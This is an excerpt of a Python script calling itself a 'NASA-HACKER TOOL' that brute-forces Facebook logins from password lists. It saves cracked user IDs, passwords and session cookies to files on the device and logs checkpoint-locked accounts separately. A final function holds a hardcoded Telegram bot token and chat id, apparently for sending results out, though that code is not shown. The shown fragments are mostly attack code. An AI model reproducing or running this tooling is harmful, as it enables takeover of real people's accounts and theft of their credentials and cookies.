...
CorrectUsername = 'Afride'
key = 'true'
while key == 'true':
    username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN NASA-HACKER TOOL SUCCESSFULLY') 
            time.sleep(1)
            clear()
            key = 'false'
...
def rd(ids,passlist):
	try:
		...
		for pas in passlist:                                          
			...
			if 'session_key' in po:
				uid = str(po['uid'])                                  
				print('\r\r\033[1;32m [HACKER-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
				open('/sdcard/HACKER-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
                                
				break
			elif 'www.facebook.com' in po['error']['message']:                                
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [NASA-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/NASA-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
    ...
    try:
        for ps in passlist:            
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [HACKER-OK] '+ids+' | '+ps)                
                print('\033[1;37m [🍪] Cookies :- '+coki)                
                open('/sdcard/HACKER-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f'\r\r\033[1;33m [NASA-CP] '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/NASA-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mNASA-HACKER '+ids+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
...
def newidx(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mNASA\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
...
def suyaib():
    ...
    bot_token = '6592649577:AAGZfE9Fsvrj4P0Tqy7hCpvf1WMyM-p-Cw4' 
    chat_id = '5680181184'    
    #-------------( /sdcard\ )--------------#  
    #--------------------apk-------------------#																																							
    try:
